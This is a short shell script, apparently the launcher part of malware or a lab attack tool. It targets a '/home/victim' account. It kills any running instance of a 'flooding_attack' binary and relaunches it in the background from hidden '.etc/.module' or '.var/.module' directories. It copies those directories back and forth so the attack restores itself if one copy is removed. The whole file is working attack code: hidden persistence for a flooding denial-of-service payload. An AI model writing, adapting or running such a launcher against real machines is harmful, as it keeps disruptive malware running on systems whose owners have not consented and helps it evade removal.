#!/bin/sh

home_dir="/home/victim"
launch_dir=".Launch_Attack"
dir01=".etc"
dir02=".var"
module_dir=".module"
launch_file="launching_attack.sh"
flooding_file="flooding_attack"

is_process_exist() {
  local process_name="flooding_attack"
  ps -e | grep -q "$process_name"
}

check_file_and_launch_attack() { # restore corrupted files
  if [ -f "$home_dir/$dir01/$module_dir/$flooding_file" ] ||\
    [ ! -d "$home_dir/$dir02" ] ||\
    [ ! -d "$home_dir/$dir02/$module_dir" ] ||\
    [ ! -f "$home_dir/$dir02/$module_dir/$launch_file" ] ||\
    [ ! -f "$home_dir/$dir02/$module_dir/$flooding_file" ]
  then
    $home_dir/$dir01/$module_dir/flooding_attack&
    cp -r "$home_dir/$dir01" "$home_dir/$dir02"
  elif [ -f "$home_dir/$dir02/$module_dir/$flooding_file" ] ||\
    [ ! -d "$home_dir/$dir01" ] ||\
    [ ! -d "$home_dir/$dir01/$module_dir" ] ||\
    [ ! -f "$home_dir/$dir01/$module_dir/$launch_file" ] ||\
    [ ! -f "$home_dir/$dir01/$module_dir/$flooding_file" ]
  then
    $home_dir/$dir02/$module_dir/flooding_attack&
    cp -r "$home_dir/$dir02" "$home_dir/$dir01"
  fi
}

payload() {
  is_process_exist
  if [ $? -eq 0 ]; then # positive match
    echo "Attack already launched!"
    pkill -f /home/victim/.etc/.module/flooding_attack
    pkill -f /home/victim/.var/.module/flooding_attack
  fi
  echo "Launching Flooding Attack..."
  check_file_and_launch_attack
  echo "Flooding Attack running Background!"
}

main() {
  payload
}
main
